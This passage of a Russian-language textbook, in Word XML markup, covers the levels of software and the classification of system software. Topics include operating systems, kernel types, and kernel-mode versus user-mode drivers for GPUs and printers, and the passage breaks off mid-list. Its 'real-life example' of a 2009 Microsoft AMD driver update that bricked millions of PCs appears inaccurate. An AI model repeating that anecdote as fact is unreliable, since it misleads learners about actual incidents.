        <w:t>**Теория:** Опиши иерархию уровней ПО (аппаратный, системный, сервисный, прикладной). Приведи по два примера программ для каждого уровня. Почему уровни важны?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Ты запускаешь игру Cyberpunk 2077 на ПК с Windows. Игра использует DirectX 12 для отрисовки графики. Опиши цепочку взаимодействия уровней ПО от клика мышкой в игре до отображения кадра на экране. Укажи, какие уровни задействованы на каждом этапе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнение:** В чём разница между системным ПО (драйвер видеокарты) и прикладным ПО (игра)? Что произойдёт, если драйвер крашнется? А если крашнется игра?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**API и библиотеки:** Зачем нужны API (например, WinAPI, OpenGL)? Почему программисты не пишут всё с нуля, а используют готовые библиотеки? Приведи пример: как `printf()` в C работает с ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Компиляция vs интерпретация:** Программа на C (компилятор GCC) работает в 100 раз быстрее, чем на Python (интерпретатор). Но Python популярнее в веб-разработке и анализе данных. Почему? В каких задачах скорость выполнения критична, а в каких — скорость разработки важнее?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Программное обеспечение организовано в уровни: аппаратный (железо), системный (ОС + драйверы), сервисный (библиотеки + компиляторы), прикладной (программы для людей). Каждый уровень опирается на предыдущий. Системное ПО управляет железом, сервисное ПО предоставляет инструменты для разработки, прикладное ПО решает задачи пользователей. Без слоёной архитектуры компьютеры были бы непрограммируемыми монстрами, а программисты писали бы всё на ассемблере и умирали от депрессии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Следующая глава (3.3) — классификация системного ПО: детально разберём ОС, драйверы, утилиты, и зачем вообще нужны антивирусы (спойлер: Windows Defender уже неплох).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 3.3: Классификация системного программного обеспечения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Итак, в главе 3.1 мы разобрались, что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>операционная система</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это менеджер, который управляет железом и не даёт процессам убить друг друга. В главе 3.2 построили слоёный пирог из уровней ПО: от железа до игр. Теперь пора нырнуть глубже в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>системное ПО</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — самый фундаментальный слой программ, который стоит между голым железом и всем остальным софтом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системное ПО</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программы, которые управляют железом и обеспечивают работу других программ. Без системного ПО компьютер — это кирпич с вентиляторами. С системным ПО — это машина, которая может делать что угодно: от запуска игры до управления марсоходом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое системное ПО и зачем оно нужно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Операционные системы** (краткое напоминание из главы 3.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Драйверы** — переводчики между ОС и железом (и почему они вызывают BSOD)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системные утилиты** — армия помощников для управления системой (диспетчер задач, антивирусы, архиваторы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почему кривой драйвер видеокарты может положить всю систему, а вылет игры — нет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3.1. Определение системного ПО</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системное программное обеспечение (системное ПО)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это набор программ, которые управляют аппаратными ресурсами компьютера и обеспечивают платформу для выполнения прикладных программ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые характеристики системного ПО:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Работает близко к железу:** Системное ПО напрямую взаимодействует с процессором, памятью, дисками, устройствами ввода-вывода. Одна ошибка — и система падает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обязательно для работы компьютера:** Без системного ПО компьютер не может функционировать. Без прикладного ПО (игры, браузеры) компьютер работает, но скучно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Пишется на низкоуровневых языках:** C, C++, Assembly, Rust. Производительность критична, абстракции — роскошь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ошибки катастрофичны:** Баг в игре → игра вылетит. Баг в драйвере → Blue Screen of Death. Баг в ядре → система мертва.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Три основных категории системного ПО:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Операционные системы (ОС)** — ядро системного ПО, управляет всем.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Драйверы устройств** — переводчики между ОС и железом.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Системные утилиты** — инструменты для управления и обслуживания системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Давай разберём каждую категорию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3.2. Операционные системы (краткое напоминание)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В главе 3.1 мы детально разобрали ОС. Вот краткая выжимка:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Операционная система (ОС)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это комплекс программ, которые управляют аппаратными ресурсами и предоставляют сервисы для пользовательских приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные функции ОС (коротко)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Управление процессами:** Планирование, многозадачность, создание/уничтожение процессов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Управление памятью:** Виртуальная память, защита адресных пространств, подкачка страниц.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Управление файловой системой:** Создание/чтение/запись/удаление файлов. NTFS, ext4, APFS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Управление устройствами ввода-вывода:** Загрузка драйверов, буферизация данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Пользовательский интерфейс:** CLI (командная строка) или GUI (графический интерфейс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Архитектура ядра (коротко)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Монолитное ядро (Linux):** Всё в одном адресном пространстве. Быстро, но рискованно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Микроядро (Minix, QNX):** Минимальное ядро, драйверы в пользовательском режиме. Надёжно, но медленнее.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Гибридное ядро (Windows, macOS):** Компромисс между монолитным и микроядром.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows** (настольные ПК, игры) — гибридное ядро, NTFS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux** (серверы, встраиваемые системы, Android) — монолитное ядро, ext4.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS** (Mac, дизайн, разработка) — гибридное ядро (XNU), APFS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Android / iOS** (смартфоны, планшеты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ОС — это фундамент системного ПО. Без ОС драйверы и утилиты бесполезны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3.3. Драйверы устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Драйвер (Device Driver)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа, которая переводит команды операционной системы в инструкции для конкретного устройства (видеокарта, принтер, клавиатура, мышь, диск).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Зачем нужны драйверы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представь, что ты — менеджер ресторана (ОС), а повара — это устройства (видеокарта, принтер, диск). Каждый повар говорит на своём языке: один — на итальянском, другой — на японском, третий — на кингонском. Ты не можешь напрямую дать им команды. Тебе нужны переводчики — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>драйверы</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Без драйверов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОС не знает, как отправить данные на принтер HP LaserJet.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОС не знает, как заставить видеокарту NVIDIA нарисовать треугольник.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОС не знает, как прочитать данные с SSD Samsung 980 Pro.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>С драйверами:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программа говорит ОС: "Выведи текст на экран".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОС говорит драйверу видеокарты: "Нарисуй текст".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер переводит команду в инструкции для GPU.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GPU рисует текст.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Драйвер — это адаптер питания. У тебя американская розетка (устройство), а вилка европейская (ОС). Без адаптера (драйвера) не работает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы драйверов по уровню работы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Драйверы работают на двух уровнях: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>kernel-mode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (режим ядра) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>user-mode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (пользовательский режим).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Kernel-mode drivers (драйверы режима ядра)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Драйверы, работающие в привилегированном режиме (kernel mode). Имеют полный доступ к памяти и железу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы видеокарт (NVIDIA, AMD) — управляют GPU.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы дисковых контроллеров (SATA, NVMe) — управляют чтением/записью на диск.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы сетевых карт (Ethernet, Wi-Fi) — управляют передачей пакетов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы USB-контроллеров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Максимальная производительность:** Прямой доступ к железу, минимум задержек.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Максимальный риск:** Ошибка в драйвере → **Blue Screen of Death (BSOD)** в Windows или **kernel panic** в Linux.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему kernel-mode драйверы опасны?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представь, что драйвер — это хирург, который оперирует мозг (ядро ОС). Если хирург ошибётся — пациент умрёт. Так же и с драйвером: если он запишет данные не туда, перезапишет память ядра, разыменует нулевой указатель — система упадёт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример из жизни:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В 2009 году Microsoft выпустила обновление драйвера для AMD-процессоров. Драйвер содержал баг, который вызывал BSOD при загрузке Windows. Миллионы компьютеров по всему миру превратились в кирпичи. Microsoft откатила обновление за 3 дня, но репутация пострадала.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. User-mode drivers (драйверы пользовательского режима)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Драйверы, работающие как обычные программы (user mode). Не имеют прямого доступа к железу, обращаются к нему через ядро.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы принтеров (HP, Canon, Epson) — обрабатывают задания на печать.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы сканеров.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Некоторые драйверы USB-устройств (веб-камеры, USB-флешки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность:** Если драйвер крашнется, упадёт только он сам. Система выживет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Медленнее:** Нужно переключаться между user mode и kernel mode (накладные расходы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Драйвер принтера HP LaserJet работает в user mode. Ты отправил документ на печать. Драйвер обрабатывает документ, формирует команды для принтера, отправляет их через USB. Если драйвер крашнется — печать не удастся, но ОС продолжит работать. Можешь перезапустить драйвер и попробовать снова.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы драйверов по устройствам</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Драйверы видеокарт (GPU drivers)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Управляют графическим процессором (GPU), переводят команды DirectX/OpenGL/Vulkan в инструкции для видеокарты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NVIDIA GeForce drivers** — для видеокарт NVIDIA (GeForce RTX 4090, RTX 3080).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AMD Radeon drivers** — для видеокарт AMD (Radeon RX 7900 XTX).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Intel integrated graphics drivers** — для встроенной графики Intel.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему драйверы GPU важны?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Видеокарта без драйвера — это кусок металла, который греется. Драйвер превращает её в машину для рендеринга 3D-графики. Современные игры (Cyberpunk 2077, Elden Ring) используют миллиарды полигонов, сотни текстур, сложные шейдеры. Драйвер оптимизирует всё это, чтобы ты получил 60 FPS вместо 10.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы с драйверами GPU:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**BSOD (Blue Screen of Death):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер NVIDIA содержит баг → обращается к несуществующему адресу памяти → ядро Windows падает → экран синий, текст "DRIVER_IRQL_NOT_LESS_OR_EQUAL".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Единственное решение: перезагрузка и обновление драйвера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Графические артефакты:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер работает криво → текстуры мерцают, полигоны искажаются, экран покрывается квадратиками.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Часто помогает откат на старую версию драйвера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Несовместимость:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Новая игра вышла → старый драйвер не поддерживает новые фичи → игра не запускается или лагает.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решение: обновить драйвер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>У тебя NVIDIA GeForce RTX 4090. Запустил Cyberpunk 2077 с трассировкой лучей (ray tracing). Игра тормозит (20 FPS). Обновил драйвер NVIDIA до последней версии (Game Ready Driver). FPS вырос до 60. Драйвер оптимизировал код под новую игру. Магия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Драйверы принтеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Переводят документ (Word, PDF) в команды для принтера (PostScript, PCL, ESC/P).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HP LaserJet drivers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Canon PIXMA drivers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Epson drivers</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работают в **user mode** (безопасно).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддерживают разные форматы бумаги, разрешения, цветовые профили.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Несовместимость:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
